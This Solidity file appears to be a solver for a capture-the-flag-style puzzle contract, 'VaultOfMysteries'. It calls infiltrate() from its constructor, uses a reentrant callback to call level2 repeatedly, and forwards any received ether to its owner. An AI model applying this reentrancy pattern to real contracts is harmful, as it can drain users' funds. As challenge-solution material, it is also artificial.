// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {ClueFinder} from "./ClueFinder.sol";
import {ILevel2} from "./VaultOfMysteries.sol";

interface IVaultOfMysteries {
    function infiltrate() external;
    function level0() external;
    function level1(uint256 value) external;
    function level2(address investigator) external;
    function level3(address investigator) external;
    function level4(address investigator) external;
}

contract VaultSolver is ILevel2 {
    IVaultOfMysteries public immutable vault;
    ClueFinder public immutable clueFinder;
    uint256 private depth;
    address public owner;

    error Unauthorized(address caller, address expected);
    error TransferFailed(address to, uint256 amount);

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);

    constructor(address vaultAddress, ClueFinder helper, address initialOwner) {
        vault = IVaultOfMysteries(vaultAddress);
        clueFinder = helper;
        owner = initialOwner;

        // Call infiltrate during construction so this contract becomes the infiltrator.
        vault.infiltrate();
    }

    function changeOwner(address newOwner) external {
        if (msg.sender != owner) revert Unauthorized(msg.sender, owner);
        owner = newOwner;
        emit OwnerChanged(msg.sender, newOwner);
    }

    function solveLevel0() external {
        vault.level0();
    }

    function solveLevel1(uint256 value) external {
        vault.level1(value);
    }

    function solveLevel2() external {
        depth = 0;
        vault.level2(address(this));
        depth = 0;
    }

    function investigate() external override {
        if (msg.sender != address(vault)) revert Unauthorized(msg.sender, address(vault));

        if (depth < 10) {
            depth += 1;
            vault.level2(address(this));
        }
    }

    function solveLevel3() external {
        vault.level3(address(clueFinder));
    }

    function solveLevel4() external {
        vault.level4(address(this));
    }

    receive() external payable {
        uint256 value = address(this).balance;
        (bool success,) = owner.call{value: value}("");
        if (!success) revert TransferFailed(owner, value);
    }
}
